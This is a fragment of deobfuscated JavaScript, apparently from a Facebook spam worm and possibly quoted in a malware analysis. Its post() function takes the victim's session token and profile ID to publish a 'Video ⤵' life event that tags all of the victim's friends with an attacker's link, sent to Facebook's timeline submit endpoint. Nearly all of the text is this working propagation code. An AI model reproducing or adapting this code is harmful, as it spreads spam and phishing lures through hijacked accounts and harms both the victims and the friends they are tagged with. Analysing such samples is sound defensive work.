...
function post(c) {
  var b = c["tags"];
  var e = c["link"];
  var elementid = "rc.u_"+rastgele(1)+"_"+rastgele(2);
  var d$$0 = {};
  d$$0["fb_dtsg"] = fb_dtsg;
  d$$0["title"] = "Video ⤵  ⤵  ⤵  ⤵";  //translated title
  i = 0;
  for (;i < c["tags"].length;i++) {
    d$$0["with[" + i + "]"] = c["tags"][i].uid;
  }
  i = 0;
  for (;i < c["tags"].length;i++) {
    d$$0["text_with[" + i + "]"] = c["tags"][i].name;
  }
  d$$0["where_hub_id"] = "";
  d$$0["where_hub_text"] = "";
  d$$0["date_start[year]"] = 2017;
  d$$0["date_start[month]"] = 11;
  d$$0["date_start[day]"] = 7;
  d$$0["story"] = c.link;
  d$$0["hub_id"] = 259146494103906;
  d$$0["hub_type_id"] = 110479285719045;
  d$$0["profile_id"] = profile_id;
  d$$0["session_id"] = "";
  d$$0["surfacecomposer"] = "composer";
  d$$0["creation_time"] = 0;
  d$$0["isstart"] = 0;
  d$$0["renderlocation"] = 10;
  d$$0["icon"] = "";
  d$$0["relativeelementid"] = elementid;
  d$$0["flyout"] = 1;
  ...
  d$$0["__spin_r"] = __rev;
  d$$0["__spin_b"] = "trunk";
  d$$0["__spin_t"] = Math.floor(Date.now() / 1E3);
  var f = new sie;
  f["open"]("POST", "https://www.facebook.com/ajax/timeline/mle_submit.php?composer_id="+ elementid +"&av="+ profile_id +"&dpr=1");
